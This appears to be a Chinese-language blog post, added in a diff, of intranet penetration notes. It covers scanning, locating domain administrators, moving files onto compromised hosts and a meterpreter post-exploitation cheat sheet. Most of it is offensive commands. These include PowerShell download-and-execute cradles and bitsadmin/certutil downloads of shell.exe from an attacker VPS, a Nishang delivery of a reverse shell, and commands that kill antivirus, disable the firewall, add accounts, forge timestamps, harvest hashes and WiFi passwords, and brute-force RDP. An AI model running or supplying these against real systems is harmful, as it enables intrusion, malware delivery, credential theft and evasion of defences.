+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port &#x27;1-65535&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>// -ResolveHost：解析主机名</p>
+<p>Nmap扫描</p>
+<p>这个工具就不用说了，在侵入内网后，挂上代理直接对内网主机扫描即可，也是我最常用的一个。详情见我的文章《内网渗透测试：隐藏通讯隧道技术》</p>
+<h2 id="Metasploit-端口扫描模块"><a href="#Metasploit-端口扫描模块" class="headerlink" title="Metasploit 端口扫描模块"></a>Metasploit 端口扫描模块</h2><p>Metasploit中提供了很多内置的扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack                                                       </span><br><span class="line">auxiliary/scanner/portscan/syn                                    </span><br><span class="line">auxiliary/scanner/portscan/tcp        </span><br></pre></td></tr></table></figure>
+
+<p>​                                                             </p>
+<h2 id="收集域内端口的banner信息"><a href="#收集域内端口的banner信息" class="headerlink" title="收集域内端口的banner信息"></a>收集域内端口的banner信息</h2><p>banner信息表示“欢迎语”，其中会包含一些敏感信息，在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等，而版本号信息有时会存在公开的CVE可以利用。获取到版本号后，可以在中查找到对应的CVE编号，并在ExploitDB等平台上面找到相关的利用方式。</p>
+<p>使用Nmap获取banner</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（666口好像是个木马）</p>
+<p>使用nc获取banner</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv &lt;IP地址&gt; &lt;端口&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="探测内网主机存活"><a href="#探测内网主机存活" class="headerlink" title="探测内网主机存活"></a>探测内网主机存活</h1><p>使用Metasploit模块</p>
+<p>Metasploit中提供了很多内置的内网存活主机扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br><span class="line">auxiliary/scanner/discovery/arp_sweep                    // 基于arp的主机发现           </span><br><span class="line">auxiliary/scanner/discovery/empty_udp                                            </span><br><span class="line">auxiliary/scanner/discovery/udp_probe                              </span><br><span class="line">auxiliary/scanner/discovery/udp_sweep  </span><br></pre></td></tr></table></figure>
+
+<h2 id="利用NetBIOS快速扫描内网存活"><a href="#利用NetBIOS快速扫描内网存活" class="headerlink" title="利用NetBIOS快速扫描内网存活"></a>利用NetBIOS快速扫描内网存活</h2><p>Netbios：网络基本输入输出系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，Netbios是一种应用程序接口(API)，系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名解析为相应IP地址，几乎所有的局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名称，主要用于局域网内计算机的互访。NetBIOS的工作流程就是正常的机器名解析查询应答过程。在Windows操作系统中，默认情况下在安装 TCP/IP 协议后会自动安装NetBIOS。</p>
+<p>nbtscan.exe是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MrAnonymous-1/nbtscan">https://github.com/MrAnonymous-1/nbtscan</a></p>
+<p>将nbtscan.exe上传到目标主机上，然后直接输入ip段即可运行扫描：</p>
+<p>nbtscan.exe 192.168.1.0/24</p>
+<p>扫描两个网段：</p>
+<pre><code>SHARING：该主机存在正在运行的文件和打印共享服务
+
+DC：该机器可能是域控制器
+
+?：没有识别处该机器的NetBIOS资源
+</code></pre>
+<h1 id="利用Ping探测内网主机存活（ICMP）"><a href="#利用Ping探测内网主机存活（ICMP）" class="headerlink" title="利用Ping探测内网主机存活（ICMP）"></a>利用Ping探测内网主机存活（ICMP）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>基于ARP的主机探测</p>
+<h2 id="利用arp-scan-exe工具。"><a href="#利用arp-scan-exe工具。" class="headerlink" title="利用arp-scan.exe工具。"></a>利用arp-scan.exe工具。</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MrAnonymous-1/arp-scan">https://github.com/MrAnonymous-1/arp-scan</a></p>
+<p>将对应系统版本的arp-scan上传到目标主机上，执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t &lt;IP段&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h2><p>这个工具就不用说了，在侵入内网后，挂上代理直接对内网主机扫描即可。<br>定位域管理员</p>
+<pre><code>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到系统管理员组中。因此，域管理员组的成员均可以访问本地计算机，且具备完全控制权限。
+</code></pre>
+<p>我们在渗透中，常常使用各种工具来获取当前域管理员在线登录的机器，入侵此机器，然后迁移到域管理登陆所在的进程，便拥有了域管理的权限。定位域内管理员的常规方法，一是日志，二是会话。<br>利用 psloggedon.exe</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
+<p>psloggedon.exe可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户。如果指定的是用户名而不是机器名，psloggedon.exe会搜索网上邻居中的所有计算机，并显示该用户是否已经登录。该工具的某些功能需要管理员权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psloggedon.exe [-] [-l] [-x] [\\computername或username]</span><br></pre></td></tr></table></figure>
+
+<p>查看登陆过OWA(域控)机器的用户：</p>
+<p>查看本地登陆的用户：</p>
+<p>指定用户名，在网络中查找指定用户登陆的计算机：</p>
+<p>\computername    指定要为其列出登录信息的计算机的名称<br>username    指定用户名，在网络中搜索该用户登陆的计算机<br>利用 PVEFindADUser.exe</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
+<p>PVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置.NET Framework 2.0 环境，并需要有管理员权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PVEFindADUser.exe &lt;参数&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们一般直接运行pvefinaduser.exe -current命令，即可显示域中所有计算机上当前登陆的所有用户。 </p>
+<p>显示域中所有计算机上当前登陆的所有用户：</p>
+<p>显示指定用户登陆的计算机：</p>
+<p>具体参数：<br>current[“username”]    如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名(Domain\Username)，则显示该用户登陆的计算机</p>
+<p>其他参数：<br>-target    用于指定要查询的主机。如果未指定此参数，将查询当前与内所有主机<br>利用 PowerView.ps1 脚本</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
+<p>powerview脚本可以用来获取当前域管理员在线登录的服务器，其依赖powershell和wmi，在powersploit工具包中，是一个收集域信息很好用的脚本。</p>
+<pre><code>Invoke-UserHunter：搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。
+</code></pre>
+<p>如下，可以看到本地域有两个域管理员：</p>
+<p>我们通过Invoke-UserHunter（等于Invoke-UserHunter -CheckAccess）来定位他们：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1&#x27;);Invoke-UserHunter</span><br></pre></td></tr></table></figure>
+
+<p>详情请执行Get-Help Invoke-UserHunter命令查看，具体使用方法与前两个相似，它可以找到域内特定的用户群，接受用户名、用户列表和域组列表查询，接受一个主机列表或查询可用的主机域名。一切都是灵活的，让你自己定义找寻谁，在哪里找。</p>
+<p>获取指定用户在线机器：</p>
+<p>PowerView是个非常强大、好用的内网渗透脚本，PowerView的其他命令请查看官方文档。<br>渗透中的文件上传与下载</p>
+<p>有时候我们在拿下一台机器的控制权后，需要在这台主机上上传一些东西，有时还需要将目标机上的文件下载下来。我总结了一下几种方式。<br>利用Powershell进行文件上传</p>
+<h1 id="下载脚本并在内存中执行"><a href="#下载脚本并在内存中执行" class="headerlink" title="下载脚本并在内存中执行"></a>下载脚本并在内存中执行</h1><p>powershell -nop -exec bypass -c “IEX(New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/xxx.ps1&#39;)&quot;">http://39.xxx.xxx.210/xxx.ps1&#39;)&quot;</a>  </p>
+<h1 id="下载文件到指定目录"><a href="#下载文件到指定目录" class="headerlink" title="下载文件到指定目录"></a>下载文件到指定目录</h1><p>powershell (new-object system.net.webclient).downloadfile(‘<a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/shell.exe&#39;,&#39;d:/test.exe&#39;">http://39.xxx.xxx.210/shell.exe&#39;,&#39;d:/test.exe&#39;</a>)</p>
+<h1 id="下载文件到当前目录"><a href="#下载文件到当前目录" class="headerlink" title="下载文件到当前目录"></a>下载文件到当前目录</h1><p>powershell (new-object system.net.webclient).downloadfile(‘<a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/test.exe&#39;,&#39;test.exe&#39;">http://39.xxx.xxx.210/test.exe&#39;,&#39;test.exe&#39;</a>)</p>
+<p>利用Nishang实现文件上传</p>
+<p>Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为exe可执行文件执行。</p>
+<p>第一步：首先攻击者在本地用Nishang中的exetotext.ps1脚本将exe可执行文件更改为文本文件（这里我们的exe为msf生成的shell.exe）</p>
+<p>powershell -nop -exec bypass -c “IEX(New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/nishang/Utility/ExetoText.ps1&#39;);ExetoText">http://39.xxx.xxx.210/nishang/Utility/ExetoText.ps1&#39;);ExetoText</a> c:\shell.exe c:\shell.txt” </p>
+<p>之后，将生成的shell.txt放到vps上面，然后在目标主机上面用Download_Execute脚本下载改shell.txt，将其转化为exe后执行</p>
+<p>powershell -nop -exec bypass -c “IEX(New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/nishang/Execution/Download_Execute.ps1&#39;);Download_Execute">http://39.xxx.xxx.210/nishang/Execution/Download_Execute.ps1&#39;);Download_Execute</a> <a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/shell.txt">http://39.xxx.xxx.210/shell.txt</a></p>
+<p>此时正在监听的msf上反弹回了shell：</p>
+<p>利用bitsadmin命令上传文件</p>
+<p>bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是 windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。</p>
+<p>如下，我们利用bitsadmin就可以网目标主机上上传一个文件（将位于外网的文件下载到目标主机上）</p>
+<p>bitsadmin /transfer &lt;任务名&gt; <remote_url> <local_name></local_name></remote_url></p>
+<p>bitsadmin /transfer shell <a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/shell.exe">http://39.xxx.xxx.210/shell.exe</a> c:\users\Liu Sir\shell.exe    </p>
+<p>// “任务名” 可以随意起，保存文件的文件路径必须是已经存在的有权限的目录，否则不能下载。</p>
+<p>在bitsadmin下载速度过慢的时候可以使用setpriority xxx foreground设置任务xxx为最高优先级来提速：</p>
+<p>先执行：<br>start bitsadmin /transfer shell <a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/shell.exe">http://39.xxx.xxx.210/shell.exe</a> c:\users\Liu Sir\shell1.exe<br>再执行：<br>bitsadmin /setpriority shell foreground</p>
+<p>利用certutil命令上传文件</p>
+<p>在Win7及其以后的机器都可以使用。（但该命令可能会被杀软查杀）</p>
+<p>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/shell.exe">http://39.xxx.xxx.210/shell.exe</a>    // 下载文件到当前目录下</p>
+<p>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://39.xxx.xxx.210/shell.exe">http://39.xxx.xxx.210/shell.exe</a>  c:/users/Liu Sir/shell.exe     // 下载文件到指定目录下</p>
+<p>利用FTP协议进行上传下载</p>
+<p>我们要做的是，在自己的vps上面配置好FTP服务器，就可以在目标机上通过ftp命令完成文件的上传下载了。</p>
+<pre><code>常用的 FTP 命令：
+
+open &lt;ftp服务器地址&gt;：连接指定的FTP服务器
+
+cd：进入指定的目录
+
+put/send &lt;本地文件&gt; &lt;远程目录&gt;：将目标机器本地文件上传到服务器远程目录 // send和put方法用法都基本相同，但是上传速度send却要比put快很多
+
+get &lt;远程文件&gt; &lt;本地目录&gt;：将ftp服务器上的文件下载到本地目标机器中
+</code></pre>
+<p>利用Debug向目标主机上传文件</p>
+<p>DEBUG是一个DOS实用程序，是供程序员使用的程序调试工具，可以用它检查内存中任何地方的字节以及修改任何地方的字节。它可以用于逐指令执行某个程序以验证程序运行的正确性，也可以追踪执行过程、比较一个指令执行前后的值以及比较与移动内存中数据的范围，读写文件与磁盘扇区。</p>
+<p>我们利用Debug向目标主机上传文件的原理就是，先将需要上传的exe文件转换为十六进制hex的格式，将hex的内容复制，再通过echo命令将hex内容写入到目标主机上的一个文件中，最后利用debug将hex内容编译成exe文件。</p>
+<p>接下来，我们将nc.exe工具利用debug上传至目标主机。</p>
+<p>我们使用kali中的exe2bat.exe工具（位于/usr/share/windows-binaries目录下）将二进制的nc.exe转换成16进制的表示，由于exe2bat是windows程序，所以在kali上我们要用wine来执行（linux是不能运行window下的可执行文件的，必须借助于wine）：</p>
+<p>wine exe2bat.exe nc.exe nc.txt </p>
+<p>生成一个nc.txt文件，</p>
+<p>exe2bat会把所有代码都生成好（因为本来exe2bat就是用来生成bat的），复制好这些代码，在目标机shell上一条一条的执行到倒数第三行即可将nc.exe的十六进制代码格式写入一个123.hex文件（最后两行要在debug上操作）</p>
+<p>（因为文件比较大，我就只演示性的复制几条）</p>
+<p>然后到就debug了，把nc.txt的倒数第二行粘贴到windows的shell里面执行（即123.hex作为输入，传输给debug），即依次执行一下两条命令：</p>
+<p>debug&lt;123.hex<br>copy 1.dll nc.exe</p>
+<p>执行后，会依次在目标机上生成1.dll和nc.exe。</p>
+<h2 id="msf与powersploit联合"><a href="#msf与powersploit联合" class="headerlink" title="msf与powersploit联合"></a>msf与powersploit联合</h2><p><img src="../Blog/source/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20220128012428905.png" alt="image-20220128012428905"></p>
+<p>msf拿到会话后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load powershell</span><br><span class="line"></span><br><span class="line">powershell_import</span><br><span class="line"></span><br><span class="line">powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1</span><br></pre></td></tr></table></figure>
+
+<h1 id="meterpreter后渗透命令"><a href="#meterpreter后渗透命令" class="headerlink" title="meterpreter后渗透命令"></a>meterpreter后渗透命令</h1><h2 id="手动进程迁移"><a href="#手动进程迁移" class="headerlink" title="手动进程迁移"></a>手动进程迁移</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps     //查看进程</span><br><span class="line">getpid    //查看当前shell进程id</span><br><span class="line">migrate 2844    //迁移进程</span><br></pre></td></tr></table></figure>
+
+<h2 id="自动化迁移"><a href="#自动化迁移" class="headerlink" title="自动化迁移"></a>自动化迁移</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看目标机的系统信息"><a href="#查看目标机的系统信息" class="headerlink" title="查看目标机的系统信息"></a>查看目标机的系统信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看是否运行在虚拟机上"><a href="#查看是否运行在虚拟机上" class="headerlink" title="查看是否运行在虚拟机上"></a>查看是否运行在虚拟机上</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看运行时间"><a href="#查看运行时间" class="headerlink" title="查看运行时间"></a>查看运行时间</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idletime</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<h2 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run killav</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动目标机的远程桌面协议RDP（3389）"><a href="#启动目标机的远程桌面协议RDP（3389）" class="headerlink" title="启动目标机的远程桌面协议RDP（3389）"></a>启动目标机的远程桌面协议RDP（3389）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看多少用户登录目标机"><a href="#查看多少用户登录目标机" class="headerlink" title="查看多少用户登录目标机"></a>查看多少用户登录目标机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
+
+<h2 id="列举用户安装在系统上的应用程序-目标机只存在AWVS"><a href="#列举用户安装在系统上的应用程序-目标机只存在AWVS" class="headerlink" title="列举用户安装在系统上的应用程序(目标机只存在AWVS)"></a>列举用户安装在系统上的应用程序(目标机只存在AWVS)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure>
+
+<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><h3 id="基本系统命令"><a href="#基本系统命令" class="headerlink" title="基本系统命令"></a>基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background   # 将当前会话放置后台</span><br><span class="line">sessions   # sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">bgrun / run   # 执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info   # 查看已有模块信息</span><br><span class="line">getuid   # 查看当前用户身份</span><br><span class="line">getprivs  # 查看当前用户具备的权限</span><br><span class="line">getpid   # 获取当前进程ID(PID)</span><br><span class="line">sysinfo   # 查看目标机系统信息</span><br><span class="line">irb   # 开启ruby终端</span><br><span class="line">ps   # 查看正在运行的进程    </span><br><span class="line">kill &lt;PID值&gt; # 杀死指定PID进程</span><br><span class="line">idletime     # 查看目标机闲置时间</span><br><span class="line">reboot / shutdown    # 重启/关机</span><br><span class="line">shell    # 进入目标机cmd shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用cmd命令"><a href="#常用cmd命令" class="headerlink" title="常用cmd命令"></a>常用cmd命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami  # 当前权限</span><br><span class="line">quser  # 查询当前在线的管理员</span><br><span class="line">net user  # 查看存在用户</span><br><span class="line">net user 用户名 密码 /add  # 添加用户和对应密码</span><br><span class="line">net localgroup 用户组名 用户名 /add  # 将指定用户添加到指定用户组</span><br><span class="line">netstat -ano  # 查询当前计算机中网络连接通信情况，LISTENING表示该端口处于监听状态；ESTABLISHED表示该端口处于工作（通信）状态</span><br><span class="line">systeminfo  # 查看当前计算机中的详细情况</span><br><span class="line">tasklist /svc  # 查看每个进程所对应的服务</span><br><span class="line">taskkill /f /im 程序名称  # 结束某个指定名称的程序</span><br><span class="line">taskkill /f /PID ID  # 结束某个指定PID的进程</span><br><span class="line">tasklist | findstr &quot;字符串&quot; # 查找输出结果中指定的内容</span><br><span class="line">netsh adcfirewall set allprofiles state off  # 关闭防火墙</span><br><span class="line">logoff  # 注销某个指定用户的ID</span><br><span class="line">shutdown -r  # 重启当前计算机</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="execute执行文件"><a href="#execute执行文件" class="headerlink" title="execute执行文件"></a>execute执行文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f  cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line">execute -H -m -d notepad.exe -f payload.exe -a &quot;-o hack.txt&quot;</span><br><span class="line"># -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行</span><br><span class="line">&quot;-o hack.txt&quot;是payload.exe的运行参数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="基本文件系统命令"><a href="#基本文件系统命令" class="headerlink" title="基本文件系统命令"></a>基本文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls  # 列出当前目录中的文件列表</span><br><span class="line">cd  # 进入指定目录</span><br><span class="line">getwd / pwd  # 查看当前工作目录  </span><br><span class="line">search -d c:\\ -f *.txt  # 搜索文件  -d 目录 -f 文件名</span><br><span class="line">cat c:\\123.txt  # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\  # 上传文件到目标机上</span><br><span class="line">download c:\\123.txt /tmp/  # 下载文件到本机上</span><br><span class="line">edit c:\\test.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">rm C:\\hack.txt  # 删除文件</span><br><span class="line">mkdir admin  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir admin  # 只能删除当前目录下文件夹</span><br><span class="line">getlwd / lpwd  # 查看本地当前目录</span><br><span class="line">lcd /tmp  # 切换本地目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="timestomp伪造时间戳"><a href="#timestomp伪造时间戳" class="headerlink" title="timestomp伪造时间戳"></a>timestomp伪造时间戳</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timestomp C:\\ -h   #查看帮助</span><br><span class="line">timestomp -v C:\\2.txt   #查看时间戳</span><br><span class="line">timestomp C:\\2.txt -f C:\\1.txt #将1.txt的时间戳复制给2.txt</span><br><span class="line">timestomp  c:\\test\\22.txt -z &quot;03/10/2019 11:55:55&quot; -v # 把四个属性设置为统一时间</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="基本网络命令"><a href="#基本网络命令" class="headerlink" title="基本网络命令"></a>基本网络命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig/ifconfig  # 查看网络接口信息</span><br><span class="line">netstat –ano  # 查看网络连接状态</span><br><span class="line">arp  # 查看arp缓冲表</span><br><span class="line">getproxy   # 查看代理信息</span><br><span class="line">route   # 查看路由表信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portfwd add -l 1111 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地1111端口</span><br><span class="line">rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接</span><br><span class="line">rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>
+
+<h3 id="autoroute添加路由"><a href="#autoroute添加路由" class="headerlink" title="autoroute添加路由"></a>autoroute添加路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -h # 查看帮助</span><br><span class="line">run get_local_subnets # 查看目标内网网段地址</span><br><span class="line">run autoroute -s 192.168.183.0/24  # 添加目标网段路由</span><br><span class="line">run autoroute -p  # 查看添加的路由</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用arp_scanner、portscan等进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.183.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.183.146 PORTS=3389</span><br></pre></td></tr></table></figure>
+
+<h3 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 2000</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>vim /etc/proxychains.conf</code> ，在文件末尾添加socks4代理服务器</p>
+<p>使用proxychains代理访问执行nmap操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sV -p 445 --script=smb-vuln-ms17-010.nse 192.168.183.146 # 扫描永恒之蓝漏洞</span><br><span class="line">proxychains hydra 192.168.183.146 rdp -l administrator -P password.txt -V # rdp服务暴力破解</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run arp_scanner -r 192.168.183.1/24  # 利用arp进行存活主机扫描</span><br><span class="line">run winenum  # 自动化执行一些检测脚本</span><br><span class="line">run credcollect # 获取用户hash</span><br><span class="line">run domain_list_gen  # 获取域管理账户列表</span><br><span class="line">run post/multi/gather/env  # 获取用户环境变量</span><br><span class="line">run post/windows/gather/enum_logged_on_users -c  # 列出当前登录用户</span><br><span class="line">run post/linux/gather/checkvm  # 是否虚拟机</span><br><span class="line">run post/windows/gather/checkvm  # 是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives  # 查看磁盘分区信息</span><br><span class="line">run post/windows/gather/enum_applications  # 获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   # 获取最近访问过的文档、链接信息</span><br><span class="line">run post/windows/gather/enum_ie  # 获取IE缓存</span><br><span class="line">run post/windows/gather/enum_firefox  # 获取firefox缓存</span><br><span class="line">run post/windows/gather/enum_chrome   # 获取Chrome缓存</span><br><span class="line">run post/multi/recon/local_exploit_suggester  # 获取本地提权漏洞</span><br><span class="line">run post/windows/gather/enum_patches  # 获取补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  # 查找域控</span><br><span class="line">run post/windows/gather/enum_snmp  # 获取snmp团体名称</span><br><span class="line">run post/windows/gather/credentials/vnc  # 获取vnc密码</span><br><span class="line">run post/windows/wlan/wlan_profile  # 用于读取目标主机WiFi密码</span><br><span class="line">run post/multi/gather/wlan_geolocate # 基于wlan进行地理位置确认 文件位于/root/.msf4/loot</span><br><span class="line">run post/windows/manage/killav 关闭杀毒软件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>常用的破解模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/ftp/ftp_login</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line">auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/postgres/postgres_login</span><br><span class="line">auxiliary/scanner/vnc/vnc_login</span><br><span class="line">auxiliary/scanner/pcanywhere/pcanywhere_login</span><br><span class="line">auxiliary/scanner/snmp/snmp_login</span><br><span class="line">auxiliary/scanner/ftp/anonymous</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
